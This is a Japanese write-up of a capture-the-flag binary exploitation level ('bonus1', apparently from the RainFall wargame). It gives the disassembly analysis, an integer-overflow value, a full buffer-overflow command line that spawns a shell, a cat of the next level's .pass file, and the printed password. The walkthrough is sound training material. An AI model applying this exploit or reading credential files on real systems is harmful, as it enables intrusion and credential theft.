# bonus1

## 方針

`local_14 == 0x574f4c46` だとshが起動する。
`local_3c`をバッファオーバーフローさせ、`local_14`を `0x574f4c46`に書き換える。

### local14の位置
atoiの戻り値を確認すればわかる
```
....
0x08048438 <+20>:    call   0x8048360 <atoi@plt>
0x0804843d <+25>:    mov    %eax,0x3c(%esp)
....
```

### local_3cの位置
第一引数がstackの一番上だから0x14(%esp)これ
```
....
0x08048464 <+64>:    lea    0x14(%esp),%eax
0x08048468 <+68>:    mov    %ecx,0x8(%esp)
0x0804846c <+72>:    mov    %edx,0x4(%esp)
0x08048470 <+76>:    mov    %eax,(%esp)
0x08048473 <+79>:    call   0x8048320 <memcpy@plt>
....
```

###　いい感じの値を探す
0x3c-0x14 = 28なので40バイトのオフセットがあることがわかる。

if (local_14 < 10) かつ 40バイト+書き換える4バイトの44バイト
になるような(argv1 * 4 < 10)を探す。


```
void main() {
  for (int i = 0x80000000; i <  0; i++) {

    if (i * 4 > 44) {
      printf("%d , i * 4 : %d\n", i, i * 4);
      break;
    }
  }
}
```
結果： -2147483636 , i * 4 : 48

### ans

argv1：-2147483636
argv2 : オフセット(40) + 0x574f4c46
```
bonus1@RainFall:~$ ./bonus1 -2147483636 $(python -c "import sys; sys.stdout.write('A' * 40 + '\x46\x4c\x4f\x57')")
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245

```

## memo
